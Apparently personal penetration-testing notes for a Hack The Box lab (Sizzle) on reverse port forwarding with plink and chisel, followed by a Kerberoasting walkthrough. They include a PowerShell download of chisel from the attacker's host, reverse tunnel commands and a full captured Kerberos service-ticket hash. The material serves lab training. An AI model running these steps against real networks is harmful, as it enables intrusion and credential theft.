# Port Forwarding to access Internal services

{% embed url="https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html" %}

Let's say that hypothetically there is a firewall on the machine or a port that is only accesible through local host or whatever. We need to remote portforward a the local port we want to reach to one that we want to open on our kali machine.&#x20;

The tool for the trade could either be plink.exe or chisel.exe

For this demonstration I will be using plink.exe because I am basing this off Tiberius's udemy course.&#x20;

1. Change the /etc/ssh/sshd\_config file to permit root login
2. Type `service ssh restart`
3. Transfer plink.exe
4. Execute on the victim machine as such: .\plink.exe root@our-ip -R \<the-port-that-we-want-to-open-on-our-machine>:127.0.0.1:\<local port that we want to reach>

For example if by any chance there is a website running we can simply visit it by curling our localhost and the port taht we opened or a sql database.

Hit enter a few times.

![](../../../.gitbook/assets/2022-08-11\_16-40.png)



**Chisel Port Forward**

I can run exes out of windows\temp… I can’t read in there, so need to track what i upload. I’ll grab the chisel binary from site: https://github.com/jpillora/chisel/releases. I’ll start the server on my host, and start a `python` http server so I can get `chisel` to target. Then I’ll run:

```
PS C:\windows\temp> iwr -uri http://10.10.14.4/chisel_windows_amd64.exe -outfile c.exe
PS C:\windows\temp> .\c.exe client 10.10.14.4:8008 R:88:127.0.0.1:88 R:389:localhost:389
```

The server sees:

```
root@kali# /opt/chisel/chisel server -p 8008 --reverse
2019/01/31 15:15:42 server: Reverse tunnelling enabled
2019/01/31 15:15:42 server: Fingerprint dd:1c:ff:0d:c8:c9:c5:3b:6a:06:e0:46:fb:05:e3:92
2019/01/31 15:15:42 server: Listening on 0.0.0.0:8008...
2019/01/31 15:18:55 server: session#1: Client version (1.3.1) differs from server version (0.0.0-src)
2019/01/31 15:18:55 server: proxy#1:R:0.0.0.0:88=>127.0.0.1:88: Listening
2019/01/31 15:18:55 server: proxy#2:R:0.0.0.0:389=>localhost:389: Listening
```

Now kerberoast:

```
root@kali# GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda -save -outputfile GetUserSPNs.out                                                                                                                                             
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

Password:
ServicePrincipalName  Name   MemberOf                                               PasswordLastSet      LastLogon
--------------------  -----  -----------------------------------------------------  -------------------  -------------------
http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL  2018-07-10 14:08:09  2018-07-12 10:23:50



[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

What? I’ll check the times:

```
PS htb\amanda@SIZZLE temp> date

Thursday, January 31, 2019 06:12:24 AM
```

```
root@kali# date
Thu Jan 31 06:20:45 EST 2019
```

For kerberos to work, times have to be within 5 minutes.

```
root@kali# date +%T -s "06:12:24"
06:12:24
root@kali# date
Thu Jan 31 06:12:27 EST 2019 
```

I’ll run again, and get the hash:

```
root@kali# GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

Password:
ServicePrincipalName  Name   MemberOf                                               PasswordLastSet      LastLogon                                                                                                                                    
--------------------  -----  -----------------------------------------------------  -------------------  -------------------                                                                                                                          
http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL  2018-07-10 14:08:09  2019-01-31 11:28:40                                                                                                                          



$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$7e9b64b7d5699f77c24bb5e091f958b9$b2f621ccaf317fe23bb8d38bcf46e7e6db72ee80bfc46d74f49d8f289bd00fd0cb00530f07ab266b032b15451b56db089864f7ae9c75e68d5a797e409f394bafffab1e28baa735af5bef6d9974d2239f1b856ebae73f1393aa9ca20af62f21e3ba8c83b3c749e6a9f2ed06adbe5555ae508db7cf85416862ceaa000fe3af85024eb14c340d52c00ed83aa9eaed3956666215987e020adcde5576fe0af35bd80ee552503400a8feb92ca030ed75c4934fc4508c10090a1f074ad738b26c054d9efd9bec6c9912f8a5d02896dd5ab34584eab6653b11ad826bf08c24f218d236e603ec25a8d40c7f0fd35fecce1e57a0ad899208ccec1df848e0139f2549ac4a2f5d3ba3baf1d51b3b2644f70f65a8db016d41f8cc459d961d640eedd93e2ce08ba17f65a892c4e374e8d4bb45f890a210156dc17d569c6b44b9680b5e3d42259a7b12a7e1cb5d7120e87771924b16d1c33f8eaca5d4337db36d80a7a0843702fa8415ae94fb389e4419012054fdaf237fb2477c8974f1be2a73cbc81ffd994904114b1ee4ca31a555eab060df88f5255d88ec3677133dc255c6d7703eac3fac958fbd74ab429b7f33f0f7d206e4fdcbb26bce4143dfd69101dc46e141c96697ee38902368b6a3eb216792962ae2228b186f718b7e69306f275320ed1030d830950f042f6e02fb6593b369806c324c521cbc2f4092e59339dc88abcd5f348d56ede5585bb05d62097a218f38a32122afca6cd8d507b8c753ec80dc492bf0975d2071cbd57f1e81b23c26c0a05876c37da6127273c6e6b746f3d90d79c4c9f37ff4e9d628d570b01d71df5f7b313b1c0430102b8b4f815eee195f3b27cc1900a7f8c457612da76c9ad95d3a5cfa3220c2c26da25c7a0a8edc95ad85baa386b808326ad2347c3c30e79abe85964fabc4423ff0fe786885022de638027b030784bde2f4816922ab0ad795ba5c5fcae70a01b0e731ee48a39041989c409aca5e84648d1c322f36e213db9988a9550cc5477f77adb681cb310306f00324bbad57b98844d2a426f32f946fd2f2fdba4117a1ae4299fcb60aa4c6e71eea3168e7f1ff30dbff3e62de87cf27bdd66e64e0c9579a6dbc2eabdcf9b83fe7cbf5982762b1d53226d6e6a1107d32d46f5b0128d3ecfd9da61f8235e942734762d5771c92b85480dcd66d3924110131793ebb4885ff197760ca596d9264b4ed1f2d6c7865149d00511737b6eac12a0d7c531535ab5a65087eb510507c5f29d1
```
